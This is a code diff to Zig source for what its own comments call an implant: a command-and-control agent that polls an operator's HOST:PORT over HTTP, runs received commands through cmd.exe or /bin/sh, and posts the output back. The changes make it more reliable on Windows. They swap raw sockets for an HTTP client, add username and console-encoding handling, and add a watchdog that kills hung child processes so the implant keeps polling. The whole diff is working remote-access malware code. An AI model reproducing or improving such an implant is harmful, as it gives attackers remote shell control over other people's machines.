@@ -85,75 +85,29 @@ fn b64Decode(allocator: mem.Allocator, data: []const u8) ![]u8 {
 }
 
 fn httpExchangePlain(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
-    var stream = try std.net.tcpConnectToHost(allocator, HOST, PORT);
-    defer stream.close();
+    // Prefer std.http.Client over raw sockets — Windows raw TCP + ThreadingHTTPServer
+    // often aborts the response write (WinError 10053) before the implant reads it.
+    var client = std.http.Client{ .allocator = allocator };
+    defer client.deinit();
+    const url = try std.fmt.allocPrint(allocator, "http://{s}:{d}{s}", .{ HOST, PORT, path_q });
+    defer allocator.free(url);
 
-    var req: std.ArrayList(u8) = .empty;
-    defer req.deinit(allocator);
-    const w = req.writer(allocator);
-    try w.print("{s} {s} HTTP/1.1\r\n", .{ method, path_q });
-    try w.print("Host: {s}:{d}\r\n", .{ HOST, PORT });
-    try w.print("User-Agent: {s}\r\n", .{UA});
-    try w.print("Accept: */*\r\n", .{});
-    try w.print("Connection: close\r\n", .{});
-    if (body) |b| {
-        try w.print("Content-Type: application/json\r\n", .{});
-        try w.print("Content-Length: {d}\r\n", .{b.len});
-    } else {
-        try w.print("Content-Length: 0\r\n", .{});
-    }
-    try req.appendSlice(allocator, "\r\n");
-    if (body) |b| try req.appendSlice(allocator, b);
-    try stream.writeAll(req.items);
+    var aw: std.Io.Writer.Allocating = .init(allocator);
+    defer aw.deinit();
 
-    // Only half-close on GET. SD_SEND after POST has been observed to RST the
-    // request body / response race on Windows + Python ThreadingHTTPServer,
-    // which drops /result with no server-side output.
-    if (body == null) {
-        if (builtin.os.tag == .windows) {
-            _ = std.os.windows.ws2_32.shutdown(@ptrCast(stream.handle), 1); // SD_SEND
-        } else {
-            std.posix.shutdown(stream.handle, .send) catch {};
-        }
-    }
-
-    var resp: std.ArrayList(u8) = .empty;
-    errdefer resp.deinit(allocator);
-    var buf: [4096]u8 = undefined;
-    while (true) {
-        const n = stream.read(buf[0..]) catch break;
-        if (n == 0) break;
-        try resp.appendSlice(allocator, buf[0..n]);
-        if (resp.items.len > 8 * 1024 * 1024) break;
-        // Stop early once we have headers + Content-Length body
-        if (mem.indexOf(u8, resp.items, "\r\n\r\n")) |idx| {
-            const headers = resp.items[0..idx];
-            // Case-insensitive Content-Length scan
-            var cl_pos: ?usize = null;
-            if (mem.indexOf(u8, headers, "Content-Length:")) |p| cl_pos = p;
-            if (cl_pos == null) {
-                if (mem.indexOf(u8, headers, "content-length:")) |p| cl_pos = p;
-            }
-            if (cl_pos) |cl| {
-                const after = headers[cl + "Content-Length:".len ..];
-                var i: usize = 0;
-                while (i < after.len and (after[i] == ' ' or after[i] == '\t')) : (i += 1) {}
-                var j = i;
-                while (j < after.len and after[j] >= '0' and after[j] <= '9') : (j += 1) {}
-                if (j > i) {
-                    const clen = std.fmt.parseInt(usize, after[i..j], 10) catch 0;
-                    if (resp.items.len >= idx + 4 + clen) break;
-                }
-            }
-        }
-    }
-    const raw = try resp.toOwnedSlice(allocator);
-    if (mem.indexOf(u8, raw, "\r\n\r\n")) |idx| {
-        const owned = try allocator.dupe(u8, raw[idx + 4 ..]);
-        allocator.free(raw);
-        return owned;
-    }
-    return raw;
+    const method_e: std.http.Method = if (mem.eql(u8, method, "POST")) .POST else .GET;
+    _ = try client.fetch(.{
+        .location = .{ .url = url },
+        .method = method_e,
+        .payload = body,
+        .response_writer = &aw.writer,
+        .keep_alive = false,
+        .headers = .{
+            .user_agent = .{ .override = UA },
+            .content_type = if (body != null) .{ .override = "application/json" } else .default,
+        },
+    });
+    return try allocator.dupe(u8, aw.written());
 }
 
 fn httpExchangeTls(allocator: mem.Allocator, method: []const u8, path_q: []const u8, body: ?[]const u8) ![]u8 {
@@ -207,18 +161,109 @@ fn jFloat(obj: json.Value, key: []const u8, default_v: f64) f64 {
     };
 }
 
+fn windowsWhoami(allocator: mem.Allocator) ![]u8 {
+    const user = std.process.getEnvVarOwned(allocator, "USERNAME") catch
+        return try allocator.dupe(u8, "unknown");
+    const domain = std.process.getEnvVarOwned(allocator, "USERDOMAIN") catch {
+        return user;
+    };
+    defer allocator.free(domain);
+    if (domain.len == 0 or mem.eql(u8, domain, user)) return user;
+    const joined = try std.fmt.allocPrint(allocator, "{s}\\{s}", .{ domain, user });
+    allocator.free(user);
+    return joined;
+}
+
+/// Convert Windows OEM/ANSI console bytes to UTF-8 when the slice is not valid UTF-8.
+fn windowsOemToUtf8(allocator: mem.Allocator, input: []const u8) ![]u8 {
+    if (input.len == 0) return try allocator.dupe(u8, "");
+    if (std.unicode.utf8ValidateSlice(input)) return try allocator.dupe(u8, input);
+
+    const MultiByteToWideChar = struct {
+        extern "kernel32" fn MultiByteToWideChar(
+            CodePage: u32,
+            dwFlags: u32,
+            lpMultiByteStr: [*]const u8,
+            cbMultiByte: i32,
+            lpWideCharStr: ?[*]u16,
+            cchWideChar: i32,
+        ) callconv(.winapi) i32;
+    }.MultiByteToWideChar;
+    const WideCharToMultiByte = struct {
+        extern "kernel32" fn WideCharToMultiByte(
+            CodePage: u32,
+            dwFlags: u32,
+            lpWideCharStr: [*]const u16,
+            cchWideChar: i32,
+            lpMultiByteStr: ?[*]u8,
+            cbMultiByte: i32,
+            lpDefaultChar: ?[*]const u8,
+            lpUsedDefaultChar: ?*i32,
+        ) callconv(.winapi) i32;
+    }.WideCharToMultiByte;
+
+    const CP_OEMCP: u32 = 1;
+    const CP_UTF8: u32 = 65001;
+
+    var codepage: u32 = CP_OEMCP;
+    var wide_len = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), null, 0);
+    if (wide_len <= 0) {
+        codepage = 850;
+        wide_len = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), null, 0);
+    }
+    if (wide_len <= 0) {
+        codepage = 1252;
+        wide_len = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), null, 0);
+    }
+    if (wide_len <= 0) return try allocator.dupe(u8, input);
+
+    const wide = try allocator.alloc(u16, @intCast(wide_len));
+    defer allocator.free(wide);
+    _ = MultiByteToWideChar(codepage, 0, input.ptr, @intCast(input.len), wide.ptr, wide_len);
+
+    const utf8_len = WideCharToMultiByte(CP_UTF8, 0, wide.ptr, wide_len, null, 0, null, null);
+    if (utf8_len <= 0) return try allocator.dupe(u8, input);
+    const out = try allocator.alloc(u8, @intCast(utf8_len));
+    _ = WideCharToMultiByte(CP_UTF8, 0, wide.ptr, wide_len, out.ptr, utf8_len, null, null);
+    return out;
+}
+
+fn normalizeShellOutput(allocator: mem.Allocator, raw: []u8) ![]u8 {
+    if (builtin.os.tag != .windows) return raw;
+    if (std.unicode.utf8ValidateSlice(raw)) return raw;
+    const converted = windowsOemToUtf8(allocator, raw) catch return raw;
+    allocator.free(raw);
+    return converted;
+}
+
 fn execShell(allocator: mem.Allocator, cmd: []const u8) ![]u8 {
     const trimmed = mem.trim(u8, cmd, " \t\r\n");
     if (trimmed.len == 0) return try allocator.dupe(u8, "");
 
-    var argv_buf: [3][]const u8 = undefined;
+    // Prefer env-based builtins (no child process) — avoids Windows pipe/hang races
+    if (mem.eql(u8, trimmed, "whoami")) {
+        if (builtin.os.tag == .windows) {
+            return try windowsWhoami(allocator);
+        }
+        if (std.process.getEnvVarOwned(allocator, "USER")) |u| return u else |_| {}
+    }
+    if (mem.eql(u8, trimmed, "pwd") or mem.eql(u8, trimmed, "cd")) {
+        return process.getCwdAlloc(allocator) catch try allocator.dupe(u8, ".");
+    }
+
+    var cmdline_owned: ?[]u8 = null;
+    defer if (cmdline_owned) |c| allocator.free(c);
+
+    var argv_buf: [4][]const u8 = undefined;
     const argv: []const []const u8 = blk: {
         if (builtin.os.tag == .windows) {
-            argv_buf = .{ "cmd.exe", "/c", trimmed };
+            // Ask cmd for UTF-8; normalizeShellOutput still fixes OEM if chcp is ignored
+            cmdline_owned = try std.fmt.allocPrint(allocator, "chcp 65001>nul & {s}", .{trimmed});
+            argv_buf = .{ "cmd.exe", "/d", "/c", cmdline_owned.? };
             break :blk argv_buf[0..];
         } else {
-            argv_buf = .{ "/bin/sh", "-c", trimmed };
-            break :blk argv_buf[0..];
+            argv_buf = .{ "/bin/sh", "-c", trimmed, "" };
+            break :blk argv_buf[0..3];
         }
     };
 
@@ -229,19 +274,38 @@ fn execShell(allocator: mem.Allocator, cmd: []const u8) ![]u8 {
     if (builtin.os.tag == .windows) child.create_no_window = true;
     child.spawn() catch |e| return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});
 
+    // Watchdog: kill hung children so the implant keeps polling / posting results
+    var done = std.atomic.Value(bool).init(false);
+    const Watch = struct {
+        fn run(c: *process.Child, flag: *std.atomic.Value(bool)) void {
+            var i: u64 = 0;
+            while (i < 45) : (i += 1) {
+                if (flag.load(.seq_cst)) return;
+                sleepSecs(1);
+            }
+            if (!flag.load(.seq_cst)) _ = c.kill() catch {};
+        }
+    };
+    const watcher = std.Thread.spawn(.{}, Watch.run, .{ &child, &done }) catch null;
+
     var out: std.ArrayList(u8) = .empty;
     errdefer out.deinit(allocator);
     var errb: std.ArrayList(u8) = .empty;
     defer errb.deinit(allocator);
-    // collectOutput already waits/reaps the child — do not call wait() again
     child.collectOutput(allocator, &out, &errb, 1024 * 1024) catch |e| {
+        done.store(true, .seq_cst);
+        if (watcher) |t| t.join();
         _ = child.kill() catch {};
         _ = child.wait() catch {};
         return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});
     };
-    if (errb.items.len == 0) return try out.toOwnedSlice(allocator);
-    try out.appendSlice(allocator, errb.items);
-    return try out.toOwnedSlice(allocator);
+    done.store(true, .seq_cst);
+    if (watcher) |t| t.join();
+    if (errb.items.len != 0) {
+        try out.appendSlice(allocator, errb.items);
+    }
+    const raw = try out.toOwnedSlice(allocator);
+    return try normalizeShellOutput(allocator, raw);
 }
 
 const TaskResult = struct {
@@ -412,7 +476,12 @@ fn runTask(allocator: mem.Allocator, task: json.Value) !TaskResult {
         out = process.getCwdAlloc(allocator) catch try allocator.dupe(u8, ".");
     } else if (mem.eql(u8, cmd, "whoami")) {
         allocator.free(out);
-        out = try execShell(allocator, if (builtin.os.tag == .windows) "whoami" else "id -un");
+        if (builtin.os.tag == .windows) {
+            out = try windowsWhoami(allocator);
+        } else {
+            out = std.process.getEnvVarOwned(allocator, "USER") catch
+                (try execShell(allocator, "id -un"));
+        }
     } else if (mem.eql(u8, cmd, "ls")) {
         const path = jStr(args, "path") orelse ".";
         var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |e| {
